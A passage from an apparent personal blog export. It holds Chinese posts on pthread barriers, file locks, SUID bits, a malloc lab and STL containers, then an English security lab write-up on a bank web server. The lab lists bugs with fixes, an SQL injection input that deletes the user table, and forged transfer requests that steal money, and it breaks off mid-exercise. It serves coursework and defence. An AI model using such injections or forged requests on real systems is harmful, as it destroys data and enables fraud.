pthread_barrier_init( pthread_barrier_t * restrict barrier, const pthread_barrierattr_t * restrict attr, unsigned int count );int pthread_barrier_destory( pthread_barrier_t * barrier );/* 返回值是0或者PTHREAD_BARRIER_SERIAL_THREAD；否则返回错误编号 */int pthread_barrier_wait( pthread_barrier_t * barrier ); 调用pthread_barrier_wait的线程在，屏障计数没有达到pthread_barrier_init设定的时，会进入休眠状态。如果该线程是最后一个调用pthread_barrier_wait的线程，满足了屏障计数，那么所有线程都会被唤醒。 关于pthread_barrier_wait的返回值：对于任意一个线程，它返回PTHREAD_BARRIER_SERIAL_THREAD，剩下的线程返回值为0。那么就可以使一个作为主线程，它可以工作在其他所有线程已完成工作的基础上。关于屏障的属性，其接口如下： 1234567#include &lt;pthread.h&gt;int pthread_barrierattr_init( pthread_barrierattr_t * attr );int pthread_barrierattr_destory( pthread_barrierattr_t * attr );int pthread_barrierattr_getpshared( const pthread_barrierattr_t * restrict attr, int * restrict pshared );int pthread_barrierattr_setpshared( pthread_barrierattr_t * attr, int pshared ); 关于锁的思考 在加锁以及解锁的时候，为了防止死锁，一定注意每个线程的上锁顺序。使用锁是有代价的，尽量在线程中不要使用共享变量，可以使用线程特定数据TLS，这种数据对于每个线程都是私有的，具体实现见《UNIX网络编程卷1》。 还有需要注意的是，当多线程中，调用非重入的函数时，也要注意上锁。关于非重入的函数，是指该函数内部使用了静态或者全局变量。 进程Process之间的锁 关于进程之间的锁，以文件作为媒介，常用于单实例进程中，这类程序要求仅有一个实例运行。在程序刚开始运行时，需要获取锁，若获取不到就退出。所用到的锁文件一般存放在/var/run/中，后缀名为pid。 这种锁叫文件锁，又称为记录锁，以文件为媒介，可以实现对某一个文件的局部或者全局进行加锁，主要通过fctnl来实现此功能。 123#include &lt;fcntl.h&gt;int fcntl( int fd, int cmd, ... ); 对于记录锁，cmd是F_GETLK、F_SETLK或者F_SETLKW。第三个参数是一个指向flock结构体的指针，其定义如下： 1234567struct flock &#123; short l_type; /* F_RDLCK:读锁 F_WRLCK:写锁 F_UNLCK:解锁 */ short l_whence; /* SEEK_SET:文件开头 SEEK_CUR:文件当前位置 SEEK_END:文件末尾 */ off_t l_start; /* 与l_whence的相对偏移 */ off_t l_len; /* 要锁内容的长度， 0 意味着锁到文件结尾 */ pid_t l_pid; /* 返回持有该区域锁的进程pid */&#125; 这里需要注意的是：对于同一个进程来说，若对一个文件区间已经有了一把锁，如果又企图在同一文件区间加锁，那么新锁会替换旧锁！ 关于cmd的三个类型： F_GETLK: 判断flockptr所描述的锁是否能加锁成功？如果该文件区间内有了一把锁它能阻止flockptr描述的锁请求，那么会把原本文件区间内的锁信息覆盖flockptr所指的内存区域。如果不能阻止，也是说flockptr所描述的锁能成功的加锁，那么flockptr所指的内存区域不变。 **F_SETLK:**设置由flockptr所描述的锁。如果我们试图获得一把锁，而兼容性规则阻止系统给我们这把锁，那么fcntl会返回-1，errno会设置EACESS或者EAGIN. F_SETLKW: 是F_SETLK的阻塞版本，如果该锁不能被授予，那么调用进程将睡眠。 最后 要根据合适的情形下，使用合适的锁，可以对先有的锁进行封装后使用。寒假过去了，好伤心。。。制定的假期计划也有很多没有完成。说好寒假刷题呢？？？结果一题都没刷！！！想了想，自己还能在学校里安心学习的日子不到4个月了，好好珍惜这剩下的日子吧，加油 _]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[探索Linux的SUID位]]></title>
    <url>%2F2016%2F01%2F24%2F%E6%8E%A2%E7%B4%A2Linux%E7%9A%84SUID%E4%BD%8D%2F</url>
    <content type="text"><![CDATA[在系统安全中,uid扮演了非常重要的角色，这里比较深入的叙述了Linux中的uid机制。 写在前面 本学期学习的信息安全课程中，接触到了Linux的uid方面的，关于访问权限控制的知识。由于从论文上得到的知识，总感觉有点虚幻，就想自己动手探索一下：Linux中uid的特性。以下实验均出自Ubuntu 12.04 64位机器。 ruid、euid、suid 一个程序，准确的说是一个进程，拥有着这三种id。它们分别代表着： ruid : 哪个用户运行这个程序，ruid就是谁 euid : 代表着该进程的执行权限，每当进程访问一些资源时，内核就会根据进程的euid来判断该操作是否有权限执行 suid : 保存的uid的，通常与euid相同，当进程execve一个进程时，子进程的suid会保存euid字段,变成euid。而fork会把父进程的ruid、euid、suid完全的复制一份。 进程每次打开、创建或删除一个文件时，内核对文件访问权限的测试如下: 若进程的euid为0(root用户),则允许访问 若进程的euid等于文件的所有者id,那么如果文件的所有者适当的访问权限位被设置，则允许访问，否则拒绝访问。适当的访问权限指：若进程为写而打开文件，那么用户写位置1，若进程为读而打开文件，那么用户读文件位置1. 若进程的有效组id或者进程的附属组id之一等于文件的组id，那么如果组适当的访问权限被设置，则允许访问，反之则拒绝访问。 若其他用户适当的访问权限位被设置，则允许访问，否则拒绝访问。 设置权限 123#include &lt;unistd.h&gt;int setuid( uid_t uid );int setgid( gid_t gid ); 1）若进程具有root权限，即euid为0，那么setuid会将ruid、euid、suid全部设为uid参数。 2）若进程没有root权限，但uid参数等于ruid或者suid，那么setuid只将euid设置为uid参数。 3）如果上面两个条件都不满足，则errno设置为EPERM，并返回-1。 从这些特性中，可以看出，suid的出现，是可以恢复进程依据最小权限原则而临时去掉的权限的。 123456789101112131415161718#include &lt;unistd.h&gt;int seteuid( uid_t uid );int setegid( gid_t gid );``` 1）一个root用户，可以将euid设置为任意的uid参数 2）非特权用户，只能将euid设置为ruid或者suid中的一个。 从这些特性中，进程不能通过seteuid操作来恢复之前的权限的。 综述：setuid可用于临时性的改变进程的权限，而seteuid用于永久的取得进程的某些权限。注意**只有root用户执行setuid才改变suid，其他情况下setuid和seteuid均不改变suid.** ## **关于文件的S位**我们知道文件通常有三种访问权限：r w x，但有时为了达到一些特定目的，给这个文件增加了一个s位。最典型的应用即Linux中，用户修改密码这个操作。保存密码的文件除了root用户，任何人不得访问的，但普通用户可以更改其密码，也就是说对这个密码文件具有可写的权限，这一操作能得以实现，主要归功于文件的s位。 ### **s位的打开与关闭**可以使用chmod更改权限来打开s位，如下：```sh# chmod sxxx filename s = 1：代表打开粘着位，关于粘着位放在后面讲。 s = 2：代表为群组打开s位 s = 4：代表为文件的使用者打开s位。 s 也可以是上述三个值的和，作用是它们功能的并集。 关于文件s位的作用 我的一个同学非常形象的描述这个s位的作用，它就像是一个印章(戳)。如果打开这个文件的s位，也就意味着无论谁执行使用这个文件，它都拥有着文件拥有者的权限。就好像银行行长给你一张支票，上面有他的签名。无论谁拿着这张支票都可以到银行取到钱。因为银行行长的签名具有向银行取钱的权利。 那么对于Linux的shadow文件或者是passwd文件，只有root可以读写。每一个用户可以通过passwd命令来更改自己的密码，为了实现普通用户可以更改仅root才能修改的shadow文件，操作系统为passwd的使用者位打开了s位。在Ubuntu 12.04 64上权限如下： 1-rwsr-xr-x 1 root root 42824 Sep 13 2012 /usr/bin/passwd 关于文件粘着位(t)的理解 要删除一个文件，你不一定要有这个文件的写权限，但你一定要有这个文件的上级目录的写权限。也就是说，你即使没有一个文件的写权限，但你有这个文件的上级目录的写权限，你也可以把这个文件给删除，而如果没有一个目录的写权限，也就不能在这个目录下创建文件。 如何才能使一个目录既可以让任何用户写入文件，又不让用户删除这个目录下他人的文件，粘着位就是能起到这个作用。粘着位一般只用在目录上，也可作用在普通文件上。如果一个可执行程序文件这一位被设置了，那么当该程序第一次被执行时，在其终止时，程序的正文部分(机器指令)仍被保存在交换区，这使得下次执行该程序时能较快的将其载入内存。 如果用户对目录有写权限，则可以删除其中的文件和子目录，即使该用户不是这些文件的所有者，而且也没有读或写许可。粘着位出现执行许可的位置上，用t表示，设置了该位后，其它用户就不可以删除不属于他的文件和目录。但是该目录下的目录不继承该权限，要再设置才可使用。 目录/tmp和/var/tmp是设置粘着位的典型候选者–任何人都可以在这两个目录中创建文件，但用户不能删除或重命名属于其他人的文件，为此在这两个目录的文件模式都设置了粘着位。其权限如下所示： 1drwxrwxrwt 13 root root 4096 Jan 24 18:47 /tmp 注意：那么原来的执行标志x到哪里去了呢? 系统是这样规定的, 假如本来在该位上有x, 则这些特别标志 (suid, sgid, sticky) 显示为小写字母 (s, s, t). 否则, 显示为大写字母 (S, S, T) 。 测试程序 12345678910111213141516171819202122232425262728293031323334353637/* * set.c 文件 使用root权限执行的 */ #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main() &#123; uid_t ruid; uid_t euid; uid_t suid; pid_t pid; setresuid( 800, 900, 100 ); getresuid( &amp;ruid, &amp;euid, &amp;suid ); printf("orignal ruid = %d, euid = %d, suid = %d\n", ruid, euid, suid );#if 0 if( (pid = fork()) == 0 ) &#123; execve( "./hello",NULL, NULL ); &#125;#endif if((pid = fork()) == 0) &#123; getresuid( &amp;ruid, &amp;euid, &amp;suid ); printf("fork ruid = %d, euid = %d, suid = %d\n", ruid, euid, suid ); &#125;#if 0 seteuid(800); getresuid( &amp;ruid, &amp;euid, &amp;suid ); printf("seteuid(800) ruid = %d, euid = %d, suid = %d\n", ruid, euid, suid ); seteuid(900); getresuid( &amp;ruid, &amp;euid, &amp;suid ); printf("seteuid(900) ruid = %d, euid = %d, suid = %d\n", ruid, euid, suid );#endif return 0;&#125; 12345678910111213141516/* * hello.c 文件 */#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main() &#123; uid_t r_uid; uid_t e_uid; uid_t s_uid; getresuid( &amp;r_uid, &amp;e_uid, &amp;s_uid ); printf("hello --- r_uid = %d, e_uid = %d, s_uid = %d\n", r_uid, e_uid, s_uid ) ; return 0;&#125; 参考 [1] UNIX环境高级编程第4、8章 [2] 博客园的落崖惊风]]></content>
      <tags>
        <tag>系统安全</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态内存分配器的一个简易实现]]></title>
    <url>%2F2016%2F01%2F12%2F%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E5%99%A8%E7%9A%84%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[堆是进程空间里很重要的一部分，有效的使用堆可以很大程度上提高程序的性能，本文参考《深入理解计算机系统》简要的实现了一个内存分配器。 介绍 这是用C语言实现的一个简易的动态内存分配器，模拟动态内存的分配与回收，是本学期CSAPP课程的第五个实验。它是基于mmlib包所提供的一个存储器系统模型，在对此进行的扩充。实现了用于堆Heap内存管理的动态分配功能。 内存管理与动态分配 内存管理 是在系统层面对计算机内存的一种操作，它的基本要求是：在程序需要内存的时候，能够提供一种方式动态的分配给它；并且当应用程序不再使用时，要能回收。而操作系统动态分配的内存区域称作为堆(Heap)。 动态内存分配 动态内存分配器维护着一个进程的虚拟存储区域，称为堆(Heap)，对于每个进程，内核维护着一个变量brk，它指向堆区域的顶部。栈是向下增长，而堆是向上增长的。而对于brk的改变需要系统调用，因为系统调用有很大的开销，如果让用户每次需要堆的时候都自己调用系统调用是很浪费时间的，所以需要对这堆Heap的分配进行封装。 一般做法是先分一大块堆空间，然后对分配的堆空间管理起来，提供接口，以后每次用户需要申请堆的时候，调用这些封装后的函数就行了，它们是用户层的函数，开销不大，这种封装也叫做动态内存分配器。 分配器有两种类型，一种是隐式分配，一种是显示分配。本次实现是基于显示分配的。 显示分配：要求应用程序显示的释放任何已分配的块，如C、C++语言 隐式分配：也称作垃圾回收器GC(garbage collector)，是由分配器检测一个已分配块何时不再被程序所使用，并主动释放这个块，如Java、C#语言。 显示分配 本次实验是采用显示分配策略，通过一种隐式链表的形式，来链接每个空闲块以及已分配块。因为在内存分配中，不能使用复合数据类型，如队列、链表来组织这些内存块，本实验是通过对一些位进行标记，每个空闲块都有一个头部和脚部，大小为机器字长。如下图所示： 为什么要用低三位来标记一个块呢？ 内部碎片与外部碎片的折中考虑,会造成不同空余位的选择， 空3位表明最小块是8个字节。余下的位可用于其他方面的标记，比如合并后的脚部，该位用于表明前一块是否是空闲的。 这样就可以定义一些宏操作用于操纵这些空闲块，如下： 123456789101112131415/* 根据块的大小和是否被标记，计算出头部和尾部的值 */#define PACK(size,alloc) ((size)|(alloc)) #define GET(p) (*(unsigned int *)(p)) // 得到这块地址的值#define PUT(p, val) (*(unsigned int *)(p) = (val)) // 把值放到指定地址去#define GET_SIZE(p) (GET(p) &amp; ~0x7) // 因为低3位用于标记该块是否被使用#define GET_ALLOC(p) (GET(p) &amp; 0x1) // 取得该块的标记位#define HDRP(bp) ((char *)(bp) - WSIZE) // 取得该块的头部#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) // 取得该块的尾部/* 得到前一个块和后一个块 */#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE))) 参考：动态内存分配 Heap的初始化 这个简易的分配器是基于mmlib提供的存储器模型，它提供了以下2个Heap管理接口： 1234567891011121314151617181920212223242526272829#define MAX_HEAP (1&lt;&lt;20)...static char * mem_heap; // 指向堆的第一个字节static char * mem_brk; // 指向堆的最后一个字节，当需要重新扩充堆时，需要调整这个指针。static char * mem_max_addr; // 堆的最大地址加1.../* * 这里是利用malloc分配一个大的堆空间，在此基础上， * 进行的动态内存分配器的模拟。在Linux中，sbrk系统调用， * 可以直接操作堆空间，改变brk指针的位置。 */void mem_init(void) &#123; mem_heap = (char *)malloc(MAX_HEAP); // 先开辟一个大的堆空间 mem_brk = (char *)mem_heap; mem_max_addr = (char *)(mem_heap + MAX_HEAP);&#125;void * mem_sbrk(int incr) &#123; char * old_brk = mem_brk; if( ( incr &lt; 0 ) || ( (mem_brk + incr) &gt; mem_max_addr ) ) &#123; errno = ENOMEM; fprintf(stderr, "ERROR: mem_sbrk failed. Ran out of memeory..\n"); return (void *)-1; &#125; mem_brk += incr; return (void *)old_brk;&#125; 分配器的简易实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221/* single word (4) or double word (8) alignment */#define ALIGNMENT 8/* rounds up to the nearest multiple of ALIGNMENT */#define ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7)#define SIZE_T_SIZE (ALIGN(sizeof(size_t)))#define WSIZE 4 // word length#define DSIZE 8 // double word length#define CHUNKSIZE (1&lt;&lt;12) // 4 K#define MAX(x, y) ( (x)&gt;(y) ? (x):(y) )/* caculate the header and footer by the size and allocated bit */#define PACK(size,alloc) ((size)|(alloc)) #define GET(p) (*(unsigned int *)(p)) // get a value of a address#define PUT(p, val) (*(unsigned int *)(p) = (val))#define GET_SIZE(p) (GET(p) &amp; ~0x7)#define GET_ALLOC(p) (GET(p) &amp; 0x1) // get the allocated bit#define HDRP(bp) ((char *)(bp) - WSIZE)#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)/* get the next block and prev block */#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))static char * heap_listp;/* when allocated space again, we should search from this address */static char * first_search; /* we should merge these idle blocks */static void *coalesce( void * bp )&#123; size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp))); size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp))); size_t size = GET_SIZE(HDRP(bp)); if( prev_alloc &amp;&amp; next_alloc ) return bp; else if( prev_alloc &amp;&amp; ! next_alloc ) // merge with next block &#123; size += GET_SIZE(HDRP(NEXT_BLKP(bp))); PUT(HDRP(bp), PACK(size, 0)); PUT(FTRP(bp), PACK(size, 0)); &#125; else if( ! prev_alloc &amp;&amp; next_alloc ) // merge with prev block &#123; size += GET_SIZE(HDRP(PREV_BLKP(bp))); PUT(FTRP(bp), PACK(size, 0)); PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0)); bp = PREV_BLKP(bp); &#125; else // merge with prev block and next block &#123; size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp))); PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0)); PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0)); return PREV_BLKP(bp); &#125; return bp;&#125;static void *extend_heap(size_t words)&#123; char * bp; size_t size; size = (words % 2) ? (words+1) * WSIZE : words * WSIZE; if( (long)(bp = mem_sbrk(size)) == -1 ) return NULL; PUT( HDRP(bp), PACK(size, 0) ); PUT( FTRP(bp), PACK(size, 0) ); PUT( HDRP(NEXT_BLKP(bp)), PACK(0, 1) ); return coalesce(bp); // merge these spared block&#125;int mm_init(void)&#123; mem_init(); if(( heap_listp = mem_sbrk(4 * WSIZE) ) == (void *)-1 ) &#123; return -1; &#125; PUT( heap_listp, 0 ); PUT( heap_listp + (1*WSIZE), PACK(DSIZE, 1)); PUT( heap_listp + (2*WSIZE), PACK(DSIZE, 1)); PUT( heap_listp + (3*WSIZE), PACK(0, 1)); heap_listp += (2 * WSIZE); if( extend_heap(CHUNKSIZE/WSIZE) == NULL ) return -1; first_search = heap_listp; return 0;&#125;/* * mm_malloc - Allocate a block by incrementing the brk pointer. * Always allocate a block whose size is a multiple of the alignment. */static void *find_fit( size_t size )&#123; void *bp; for( bp = first_search; GET_SIZE(HDRP(bp)) &gt; 0; bp = NEXT_BLKP(bp) ) &#123; if( ! GET_ALLOC(HDRP(bp)) &amp;&amp; (size &lt;= GET_SIZE(HDRP(bp)))) &#123; first_search = bp; return bp; &#125; &#125; /* if not find, we need search from the head... */ for( bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; 0; bp = NEXT_BLKP(bp) ) &#123; if( ! GET_ALLOC(HDRP(bp)) &amp;&amp; (size &lt;= GET_SIZE(HDRP(bp)))) &#123; first_search = bp; return bp; &#125; &#125; return NULL;&#125;static void place( void *bp, size_t asize )&#123; size_t csize = GET_SIZE(HDRP(bp)); if( (csize - asize) &gt;= (2*DSIZE) ) &#123; PUT(HDRP(bp), PACK(asize, 1)); PUT(FTRP(bp), PACK(asize, 1)); bp = NEXT_BLKP(bp); PUT(HDRP(bp), PACK(csize-asize, 0)); PUT(FTRP(bp), PACK(csize-asize, 0)); &#125; else &#123; PUT(HDRP(bp), PACK(csize, 1)); PUT(FTRP(bp), PACK(csize, 1)); &#125;&#125;void *mm_malloc(size_t size)&#123; size_t asize; size_t extendsize; char *bp; if( size == 0 ) return NULL; if( size &lt;= DSIZE ) asize = 2*DSIZE; else asize = DSIZE * ((size + (DSIZE) + (DSIZE-1)) / DSIZE); if( (bp = find_fit(asize)) != NULL ) &#123; place(bp, asize); return bp; &#125; /* not find, Get more memory */ extendsize = MAX(asize, CHUNKSIZE); if( (bp = extend_heap(extendsize/WSIZE)) == NULL ) return NULL; place(bp, asize); return bp;&#125;/* * mm_free - Freeing a block does nothing. */void mm_free(void *ptr)&#123; size_t size = GET_SIZE(HDRP(ptr)); PUT(HDRP(ptr), PACK(size, 0)); PUT(FTRP(ptr), PACK(size, 0)); coalesce(ptr);&#125;/* * mm_realloc - Implemented simply in terms of mm_malloc and mm_free */void *mm_realloc(void *ptr, size_t size)&#123; if( ptr == NULL ) return mm_malloc( size ); if( size == 0 ) &#123; mm_free( ptr ); return NULL; &#125; void * old_ptr = ptr; void * new_ptr; new_ptr = mm_malloc( size ); memcpy( new_ptr, old_ptr, size ); mm_free( old_ptr ); return new_ptr;&#125; 性能测试 这个分配策略是根据&lt;&lt;深入理解计算机系统&gt;&gt;这本书写的，主要的不同点在于，我把书上的首次适配策略，换成了下一次适配策略。通过老师给的测试程序，结果显示下一次适配策略在本次实验中会取得更好的空间利用率和吞吐率的性能。 总结 以前学习操作系统的时候，只从概念上了解了栈的分配与回收，如今自己动手写了一下，对堆的结构有了更深刻的认识.总体来说:受益匪浅。 在实现堆空间块的标记和合并时，我懂得了学会使用某些标记位来代替一些复合数据结构如链表，达到像链表那样的功能。这样不仅节约了空间，而且非常高效。在这里向提出这种标记方法的大牛致敬_。]]></content>
      <tags>
        <tag>内存分配</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[STL基础数据结构]]></title>
    <url>%2F2016%2F01%2F05%2FSTL-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[最近在刷LeetCode，一直在用C实现上面的算法。但经常遇到题目，需要维护动态二维数组，需要队列、栈、map等数据结构时，用C实现时，需要很长的时间来完成这些数据结构的原型。无奈为了提高效率（偷懒~）决定转型C++解决上面的题目。 std::deque 类的原型 1template &lt; class T, class Alloc = allocator&lt;T&gt; &gt; class deque; 它位于deque文件中，先看看它的类的声明。class Alloc = allocator&lt;T&gt; 这句话什么鬼？这可能要涉及到STL六大要素之分配器了，先跳过，以后涉及到再学。 概述 deque是C++的基本容器之一，即双端队列，它可以在两端进行插入和删除操作。不同的库可能有不同的实现方式，但通常以动态数组实现的，deque中的元素存储在不同的chunks。 deque提供的函数与vector相似，但对于在两端的插入和删除操作要比vector更有效率。还有需要注意的是，不像vector, deque不保证把所有的元素以线性的地址存储，即不能通过**指针++**的形式访问下一个元素，这将导致未定义的行为，这是与vector访问元素的区别。 还有一个区别用原文叙述比较好：While vectors use a single array that needs to be occasionally reallocated for growth, the elements of a deque can be scattered in different chunks of storage, with the container keeping the necessary information internally to provide direct access to any of its elements in constant time and with a uniform sequential interface (through iterators). 容器的特性 Sequence: Elements in sequence containers are ordered in a strict linear sequence. Individual elements are accessed by their position in this sequence.每个双端队列的元素是严格的按照线性序列排序的，每个元素可以通过它在队列中的位置直接访问到，有点像数组。 Dynamic array: Generally implemented as a dynamic array, it allows direct access to any element in the sequence and provides relatively fast addition/removal of elements at the beginning or the end of the sequence.哇，真是个好东西，程序员居家、撸代码必备的特性啊—动态数组，从此再也不用担心，容器的大小不够用了，也不用malloc、realloc等等坑爹的事情了。 Allocator-aware: The container uses an allocator object to dynamically handle its storage needs.也就是说，可以自己选择这个对象的内存分配器，allocator出现源于:对内存分配和对象构造分离的需求，因为new和delete的出现，不仅代表对象的销毁，也代表了内存的空间回收。 容器的使用 Iterators : begin() end() 顺序迭代器的对尾指针 rbegin() rend() 逆序迭代器的对尾指针 cbegin() cend() 顺序迭代器的常量指针，不能更该元素的内容 crbegin() crend() 逆序迭代器的常量指针，不能更该元素的内容 Capacity : size() 双端队列中元素的个数 max_size() 与平台有关，表示这种容器能容纳的最大数，通常很大 resize() 改变容器的大小，有点像remalloc函数 empty() 测试是否为空 Element access : operator[] at() front() back() 这些方法不会修改容器的内容 Modifiers : void assign(InputIterator first, InputIterator last); void assign(size_type n, const value_type &amp; val); void assign(initializer_list&lt;value_type&gt; il); 上述三个方法，把新的内容赋值给deque容器，并取代deque之前的内容，通常会修改容器的大小。 push_back push_front pop_back pop_front insert erase swap clear emplace emplace_front emplace_back 注意emplace函数与insert函数的区别在于：前者是将参数传递给元素类型的构造函数，而后者则是调用拷贝构造函数来进行操作。当容器里面存放的是某个类的对象的话，二者的区别就体现出来了。例如： 12345678910class student &#123; public: string name; student(string username) : name(username) &#123;&#125;&#125;;......deque&lt;student&gt; ST;ST.insert(ST.end(), student("LiuChang"));ST.emplace(ST.end(), "LiuChang"); 参考：C++ Reference : deque std::queue 类的原型 1234567891011121314template &lt; class T, class Container = deque&lt;T&gt; &gt; class queue;``` 从上述原型中，可以看出，其实queue是对deque双端队列的一种封装，它放在queue头文件中。#### **基本操作**- empty- size- front : 访问队首元素- back : 访问队尾元素- push : 在队尾插入元素- pop : 移除队首元素- swap : 交换俩个队列的内容 #### 实例：二叉树的最大深度题目来源于LeetCode: Given a binary tree, find its maximum depth. The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node. 123456789101112131415161718192021222324252627282930313233这一题属于Easy级别，考虑到函数调用的开销，宜使用二叉树的层次遍历。 ```c++/** * Definition for a binary tree node. * struct TreeNode &#123; * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125; * &#125;; */class Solution &#123;public: int maxDepth(TreeNode* root) &#123; if ( root == NULL ) return 0; queue&lt;TreeNode *&gt; Q; int maxDepth = 0; Q.push(root); while(!Q.empty()) &#123; ++maxDepth; for( int i = 0, n = Q.size(); i &lt; n; i++ ) // 把当前层次的节点，全部弹出队列 &#123; TreeNode * q = Q.front(); Q.pop(); if( q-&gt;left ) Q.push(q-&gt;left); if( q-&gt;right ) Q.push(q-&gt;right); &#125; &#125; return maxDepth; &#125;&#125;; std::stack 类的原型 1template &lt; class T, class Container = deque&lt;T&gt; &gt; class stack; 它位于stack文件中，很明显，它也是对deque双端队列的封装。 基本操作 empty() size() top() 访问栈顶元素 push() 插入一个元素 emplace() 也是插入一个元素，以传参的方式 pop() 弹出元素 swap() 交换两个栈的内容 实例：合法的括号 题目来源于LeetCode: 12Given a string containing just the characters &apos;(&apos;, &apos;)&apos;, &apos;&#123;&apos;, &apos;&#125;&apos;, &apos;[&apos; and &apos;]&apos;, determine if the input string is valid.The brackets must close in the correct order, &quot;()&quot; and &quot;()[]&#123;&#125;&quot; are all valid but &quot;(]&quot; and &quot;([)]&quot; are not. 这一题属于Easy级别，很容易想到使用栈这个数据结构。代码如下： 1234567891011121314151617181920class Solution &#123;public: bool isValid(string s) &#123; stack&lt;char&gt; S; for( int i = 0; i &lt; s.size(); i++ ) &#123; if( s[i] == '(' || s[i] == '[' || s[i] == '&#123;' ) &#123; S.push(s[i]); &#125; else &#123; if( S.empty() ) return false; else if( s[i] == ')' &amp;&amp; S.top() != '(' ) return false; else if( s[i] == ']' &amp;&amp; S.top() != '[' ) return false; else if( s[i] == '&#125;' &amp;&amp; S.top() != '&#123;' ) return false; S.pop(); &#125; &#125; if( S.empty() ) return true; return false; &#125;&#125;;]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>STL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Authentication]]></title>
    <url>%2F2015%2F12%2F20%2FAuthentication%2F</url>
    <content type="text"><![CDATA[This is a experiment of Information Security, about 7 exercises and challenges in this blog. May be a lot mistakes here, if you find it, please contact me. Lab 4 : Authentication Lab Environment Setup Platform : Ubuntu 12.04 ( 64 bits ) Contents : Authentication Part A：Identity Forgery There is a new service in the Touchstone web server: the transfer service. You can first register an account in the server and log in. You can now find the account page which will present the transferring interface, along with user name, login time, among other things. Exercise 1 : There are many bugs and vulnerabilities in the current utility for transferring money. Find as many bugs as you can. For now, just focus on bugs that an adversary can trigger by giving unanticipated values to the transfer page. Think carefully about what kinds of inputs an attacker might provide, and try them out by entering them on the transfer page. Please write down detail descriptions of your observation in bugs.txt. (You should find at least 4 different bugs.) In getValues function: these key-values was parsed from the HTTP’s body and stored in the temp[16] array without boundary checking. If constructed a HTTP POST which included a lot of ‘user=liuchang&amp;passwd=123&amp;…’ strings, the banksv process will be crashed rapidly. In handlePostLogin and handlePostRegister functions: there is a serious SQL injection attack here. Because when we execute these functions, the Db_checkUser Db_readBalance and Db_checkUserPasswd are called absolutely. However we can perform a SQL injection attack in these functions easily. For example, when a attack constructs a input about username likes : liuchang’;delete from user;, we will lost all user’s datas… In handlePostTransfer function: there is no checking about the input of money filed, if given a negative number and transferring money to anyone, it will get more and more money constantly. In handlePostTransfer function: if the transferring money is bigger than his account, it will result in a negative account… An important to note, it does not check whether the user exist in users.db. In handlePostTransfer function: it doesn’t check the receiver and the sender. Now we use LiuChang account to transfer 100 $ to LiuChang, the result is funny, LiuChang will obtain 100 $ additionally. Let’s review these codes nearly. 123456int fromBalance = Db_readBalance (from); // 100$int newFromBalance = fromBalance - money; // 0$int toBalance = Db_readBalance (to); // 100$int newToBalance = toBalance + money; // 200$Db_writeBalance (from, newFromBalance); // 0$Db_writeBalance (to, newToBalance); // 200$ If the sender and the receiver is the same person, it will get more money constantly. Exercise 2 : Fix as many bugs as you can, from those you found above. Just keep your code as clean as possible. Also don’t forget to test your implementation after you fix the bugs. For the first bug: when we get key-values form HTTP body, we should check the boundary of the temp array, If exceed the boundary, we should response a error to the browser and finish this request. For the second bug: we should check these input filed, and exclude some special characters, such as ** , ; ? ** and so on. For the third bug: we should check the input of money filed, and ensure that it is a positive number. For the fourth bug: we should check the account and the receiver at first. For the fifth bug: we have many ways to fix this bug. Simple to say, we just judge that whether the two person are the same. Surely, we can also make efforts in other aspects, when calculated the value of new balance, we should update the date base at once, just likes this : 123456int fromBalance = Db_readBalance (from);int newFromBalance = fromBalance - money;Db_writeBalance (from, newFromBalance);int toBalance = Db_readBalance (to);int newToBalance = toBalance + money; // a little stupidDb_writeBalance (to, newToBalance); Exercise 3 : Read the source code of the login web page (in your browser), and the server’s source code. Make sure that you make it clear that how the server identify who is transferring. At first, if a new client comes, the server will accept a fd and send it to the httpd process. Then the httpd begins to parse the client’s requests, GET requests are sent to filesv process, while POST requests will be sent to banksv process. Before transferring money to others, banksv process parses the body of the request, and get the key-values from this body. If the first key is equal to Transfer, that’s to say, the user wants to transfer money to others. The banksv process identify who is transferring by the remaining key-values, such as transfer_from transfer_to and so on, and then start to update data base. To this point, it should be clear to us that we can fool the server. That is: if we can construct a fake POST with some specific HTTP body attributes (what should they be?), and send the request to the server, we can fool the server that a victim is transferring money. And the server will perform the transfer! Exercise 4 : Try to construct a POST request about the money transferring, which steal money from some account if you know the victim’s account (it’s often the case). You can 